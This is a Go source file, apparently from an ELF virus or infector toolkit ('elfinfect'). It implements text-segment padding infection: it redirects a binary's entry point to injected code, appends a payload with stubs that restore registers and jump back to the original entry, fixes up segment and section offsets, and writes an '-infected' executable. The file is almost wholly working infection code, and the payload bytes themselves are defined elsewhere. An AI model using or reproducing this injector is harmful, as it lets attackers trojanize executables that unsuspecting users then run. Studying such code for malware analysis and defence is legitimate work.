package elfinfect

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
)

const (
	PAGE_SIZE                       int    = 4096
	MOD_ENTRY_POINT                 string = "[+] Modified entry point from 0x%x -> 0x%x\n"
	TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
	TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
	PAYLOAD_LEN_PRE_EPILOGUE        string = "[+] Payload size pre-epilogue 0x%x\n"
	PAYLOAD_LEN_POST_EPILOGUE       string = "[+] Payload size post-epilogue 0x%x\n"
	GENERATE_AND_APPEND_PIC_STUB    string = "[+] Generated and appended position independent return 2 OEP stub to payload"
	INCREASED_TEXT_SEG_P_FILESZ     string = "[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n"
	ADJUST_SEGMENTS_AFTER_TEXT      string = "[+] Adjusting segments after text segment file offsets by 0x%x\n"
	INCREASE_PHEADER_AT_INDEX_BY    string = "Inceasing pHeader @ index %d by 0x%x\n"
	INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
)

func printPayload(p []byte) {
	fmt.Println("------------------PAYLOAD----------------------------")
	fmt.Printf("%s", hex.Dump(p))
	fmt.Println("--------------------END------------------------------")
}

func (t *TargetBin) IsElf() bool {
	t.Ident = t.Contents[:16]
	return !(t.Ident[0] != '\x7f' || t.Ident[1] != 'E' || t.Ident[2] != 'L' || t.Ident[3] != 'F')
}

func (t *TargetBin) InfectBinary(debug bool, noRestoration bool, noRetOEP bool) error {
	var textSegEnd interface{}
	var oShoff interface{}
	var textNdx int

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry := t.Hdr.(*elf.Header64).Entry
		oShoff = t.Hdr.(*elf.Header64).Shoff

		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog64)
		pNum := int(t.Hdr.(*elf.Header64).Phnum)

		for i := 0; i < pNum; i++ {
			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
				textNdx = i
				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
				if debug {
					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
				}

				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
				if debug {
					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
				}

				if noRestoration == false {
					t.Payload.Write(restoration64)
				}

				if noRetOEP == false {
					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
					t.Payload.Write(retStub)
				}

				if debug {
					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
					printPayload(t.Payload.Bytes())
				}

				t.Phdrs.([]elf.Prog64)[i].Memsz += uint64(t.Payload.Len())
				t.Phdrs.([]elf.Prog64)[i].Filesz += uint64(t.Payload.Len())

				if debug {
					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
				}
			}
		}

		if debug {
			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
		}

		for j := textNdx; j < pNum; j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
		}
		sectionHdrTable := t.Shdrs.([]elf.Section64)
		sNum := int(t.Hdr.(*elf.Header64).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint64) {
				if debug {
					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
				if debug {
					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
				}
				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
			}
		}

	case elf.ELFCLASS32:
		oEntry := t.Hdr.(*elf.Header32).Entry
		oShoff = t.Hdr.(*elf.Header32).Shoff

		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog32)
		pNum := int(t.Hdr.(*elf.Header32).Phnum)

		for i := 0; i < pNum; i++ {
			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
				textNdx = i
				t.Hdr.(*elf.Header32).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
				if debug {
					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
				}

				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
				if debug {
					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
				}

				if noRestoration == false {
					t.Payload.Write(restoration32)
				}

				if noRetOEP == false {
					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header32).Entry, oEntry)
					t.Payload.Write(retStub)
				}

				if debug {
					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
					printPayload(t.Payload.Bytes())
				}

				t.Phdrs.([]elf.Prog32)[i].Memsz += uint32(t.Payload.Len())
				t.Phdrs.([]elf.Prog32)[i].Filesz += uint32(t.Payload.Len())

				if debug {
					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
				}
			}
		}

		if debug {
			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
		}

		for j := textNdx; j < pNum; j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
		}
		sectionHdrTable := t.Shdrs.([]elf.Section32)
		sNum := int(t.Hdr.(*elf.Header32).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint32) {
				if debug {
					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
				if debug {
					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
				}
				t.Shdrs.([]elf.Section32)[k].Size += uint32(t.Payload.Len())
			}
		}
	}

	infected := new(bytes.Buffer)

	if h, ok := t.Hdr.(*elf.Header64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	var ephdrsz int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
	case elf.ELFCLASS32:
		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
	}

	infected.Write(t.Contents[ephdrsz:])

	infectedShdrTable := new(bytes.Buffer)
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
	case elf.ELFCLASS32:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
	}

	finalInfectionTwo := make([]byte, infected.Len()+int(PAGE_SIZE))
	finalInfection := infected.Bytes()

	var endOfInfection int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		copy(finalInfection[int(oShoff.(uint64)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint64))
	case elf.ELFCLASS32:
		copy(finalInfection[int(oShoff.(uint32)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint32))
	}

	copy(finalInfectionTwo, finalInfection[:endOfInfection])

	if debug {
		fmt.Println("[+] writing payload into the binary")
	}

	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())

	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
		return err
	}
	return nil
}

func (t *TargetBin) WritePreservationStub() {
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		t.Payload.Write(preserve64)
	case elf.ELFCLASS32:
		t.Payload.Write(preserve32)
	}
}

func (t *TargetBin) EnumIdent() error {
	switch elf.Class(t.Ident[elf.EI_CLASS]) {
	case elf.ELFCLASS64:
		t.Hdr = new(elf.Header64)
		t.EIdent.Arch = elf.ELFCLASS64
	case elf.ELFCLASS32:
		t.Hdr = new(elf.Header32)
		t.EIdent.Arch = elf.ELFCLASS32
	default:
		return errors.New("Invalid Arch supplied -- only x86 and x64 ELF binaries supported")
	}

	switch elf.Data(t.Ident[elf.EI_DATA]) {
	case elf.ELFDATA2LSB:
		t.EIdent.Endianness = binary.LittleEndian
	case elf.ELFDATA2MSB:
		t.EIdent.Endianness = binary.BigEndian
	default:
		return errors.New("Binary possibly corrupted -- byte order unknown")
	}

	return nil
}

func (t *TargetBin) MapHeader() error {
	h := bytes.NewReader(t.Contents)
	b := t.EIdent.Endianness

	switch a := t.EIdent.Arch; a {
	case elf.ELFCLASS64:
		t.Hdr = new(elf.Header64)
		if err := binary.Read(h, b, t.Hdr); err != nil {
			return err
		}
	case elf.ELFCLASS32:
		t.Hdr = new(elf.Header32)
		if err := binary.Read(h, b, t.Hdr); err != nil {
			return err
		}
	}
	return nil
}

func (t *TargetBin) GetSectionHeaders() error {
	if h, ok := t.Hdr.(*elf.Header64); ok {
		start := int(h.Shoff)
		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
		sr := bytes.NewBuffer(t.Contents[start:end])
		t.Shdrs = make([]elf.Section64, h.Shnum)

		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section64)); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		start := int(h.Shoff)
		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
		sr := bytes.NewBuffer(t.Contents[start:end])
		t.Shdrs = make([]elf.Section32, h.Shnum)

		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section32)); err != nil {
			return err
		}
	}

	return nil
}

func (t *TargetBin) GetProgramHeaders() error {
	if h, ok := t.Hdr.(*elf.Header64); ok {
		start := h.Phoff
		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
		pr := bytes.NewBuffer(t.Contents[start:end])
		t.Phdrs = make([]elf.Prog64, h.Phnum)

		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog64)); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		start := h.Phoff
		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
		pr := bytes.NewBuffer(t.Contents[start:end])
		t.Phdrs = make([]elf.Prog32, h.Phnum)

		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog32)); err != nil {
			return err
		}
	}

	return nil
}

func (t *TargetBin) GetFileContents() error {
	fStat, err := t.Fh.Stat()
	if err != nil {
		return err
	}

	t.Filesz = fStat.Size()
	t.Contents = make([]byte, t.Filesz)

	if _, err := t.Fh.Read(t.Contents); err != nil {
		return err
	}
	return nil
}
